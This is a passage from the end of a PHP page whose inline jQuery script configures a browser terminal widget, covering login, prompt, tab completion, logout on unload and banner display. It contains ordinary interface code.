                        login: !no_login ? login : false,
                        prompt: make_prompt(),
                        greetings: !no_login ? "You are authenticated" : "",
                        tabcompletion: true,
                        completion: completion,
                        onBlur: function() { return false; },
                        exceptionHandler: function(exception) {
                            if (!silent_mode) terminal.exception(exception);
                        }
                    });

                    // Logout
                    if (no_login) terminal.set_token('NO_LOGIN');
                    else {
                        logout();
                        $(window).unload(function() { logout(); });
                    }

                    // Banner
                    if (banner_main) terminal.echo(banner_main);
                    if (banner_extra) terminal.echo(banner_extra);
                });
            })(jQuery);
        </script>

    </head>
    <body></body>
    </html>
<?php } ?>
